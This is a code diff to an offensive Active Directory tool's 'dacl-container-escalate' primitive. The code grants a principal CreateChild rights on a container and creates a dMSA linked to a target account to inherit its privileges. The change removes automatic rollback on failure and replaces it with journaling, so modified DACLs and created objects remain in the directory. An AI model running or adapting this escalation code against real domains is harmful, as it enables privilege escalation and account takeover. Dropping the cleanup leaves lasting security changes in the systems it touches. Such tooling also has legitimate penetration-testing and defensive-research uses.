@@ -3,6 +3,7 @@ from __future__ import annotations
 from typing import TYPE_CHECKING
 
 from dmsa_reaper.ldap.dacl_editor import (
+    ace_fingerprint,
     add_aces_to_sd,
     build_allow_createchild_ace,
     read_sd,
@@ -11,7 +12,6 @@ from dmsa_reaper.ldap.dacl_editor import (
 from dmsa_reaper.ldap.modify import add_object, modify_attribute
 from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
 from dmsa_reaper.ops.operation_log import new_operation, save_operation
-from dmsa_reaper.ops.rollback import rollback_operation
 from dmsa_reaper.ops.verify import verify_operation_ldap
 from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_MANAGED_PASSWORD_INTERVAL,
@@ -20,6 +20,7 @@ from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_UAC,
     dmsa_dn,
     generate_dmsa_name,
+    journal_created_object,
     read_attribute,
     resolve_meta,
 )
@@ -45,7 +46,7 @@ class DaclContainerEscalatePrimitive(Primitive):
     Modes (set via metadata key 'chain', from --chain CLI flag):
 
       chain=legacy  (default)
-        Phase 1: Read + log container nTSecurityDescriptor for rollback.
+        Phase 1: Read + log container nTSecurityDescriptor before modification.
         Phase 2: Add CreateChild ACE (object-specific or broad).
         Phase 3: Create new dMSA with msDS-ManagedAccountPrecededByLink only.
 
@@ -57,9 +58,6 @@ class DaclContainerEscalatePrimitive(Primitive):
         postpatch attrs; if absent, raises PrimitiveError before any LDAP write
         with the message "container DACL alone is not enough …".
 
-    Rollback:
-      reversed(changed_attrs): → restore postpatch attrs (postpatch only) → restore container DACL
-      reversed(created_dns):   → delete dMSA
     """
 
     name = "dacl-container-escalate"
@@ -176,14 +174,18 @@ class DaclContainerEscalatePrimitive(Primitive):
         # ── Phase 2: add CreateChild ACE to container ──────────────────────────
         try:
             new_ace = build_allow_createchild_ace(principal_sid, object_type_bytes)
+            operation.metadata.setdefault("added_aces", []).append({
+                "dn": container_dn,
+                "sha256": ace_fingerprint(new_ace),
+                "step_name": "dacl-mod",
+            })
+            save_operation(operation)
             modified_sd = add_aces_to_sd(original_sd, [new_ace])
             write_sd(conn, container_dn, modified_sd)
         except Exception as exc:
             operation.status = "partial-failed"
             operation.errors.append(f"dacl write {container_dn}: {exc}")
             operation.metadata["execute_error"] = str(exc)
-            save_operation(operation)
-            rollback_operation(operation, conn=conn)
             save_operation(operation)
             raise PrimitiveError(f"DACL modification failed: {exc}") from exc
 
@@ -214,15 +216,14 @@ class DaclContainerEscalatePrimitive(Primitive):
                     "msDS-ManagedAccountPrecededByLink": target_dn,
                 },
             )
+            journal_created_object(operation, conn, new_dn)
         except Exception as exc:
             operation.status = "partial-failed"
             operation.errors.append(f"add_object {new_dn}: {exc}")
             operation.metadata["execute_error"] = str(exc)
             save_operation(operation)
-            rollback_operation(operation, conn=conn)
-            save_operation(operation)
             raise PrimitiveError(
-                f"dMSA creation failed after DACL modification — DACL rolled back: {exc}"
+                f"dMSA creation failed after DACL modification; partial state is recorded: {exc}"
             ) from exc
 
         if new_dn in operation.maybe_created_dns:
@@ -273,10 +274,8 @@ class DaclContainerEscalatePrimitive(Primitive):
                 operation.errors.append(f"postpatch target write {target_dn}: {exc}")
                 operation.metadata["execute_error"] = str(exc)
                 save_operation(operation)
-                rollback_operation(operation, conn=conn)
-                save_operation(operation)
                 raise PrimitiveError(
-                    f"Postpatch target write failed — all writes rolled back: {exc}"
+                    f"Postpatch target write failed; partial state is recorded: {exc}"
                 ) from exc
 
         operation.status = "executed"
@@ -285,11 +284,6 @@ class DaclContainerEscalatePrimitive(Primitive):
 
     def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
         return verify_operation_ldap(operation, conn=conn)
-
-    def rollback(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
-        operation = rollback_operation(operation, conn=conn)
-        save_operation(operation)
-        return operation.status == "rolled-back"
 
     def dry_run_steps(self, operation: Operation) -> list[str]:
         meta = operation.metadata
@@ -317,7 +311,7 @@ class DaclContainerEscalatePrimitive(Primitive):
         steps += [
             f"PHASE 1  READ    {container_dn}",
             "  attribute                               : nTSecurityDescriptor",
-            "  (original SD recorded for rollback)",
+            "  (original SD recorded before modification)",
             "",
             f"PHASE 2  MODIFY  {container_dn}",
             "  nTSecurityDescriptor                   : add ACE",
@@ -340,12 +334,8 @@ class DaclContainerEscalatePrimitive(Primitive):
                 "  (chain=postpatch — target-side WriteProperty must already be present)",
             ]
 
-        rollback_desc = "DELETE dMSA, restore container DACL"
-        if chain == "postpatch":
-            rollback_desc = "restore target attrs, DELETE dMSA, restore container DACL"
         steps += [
             "",
-            f"ROLLBACK: {rollback_desc}",
             "  (CN above is an example — a new random suffix is generated at execute time)",
         ]
         return steps
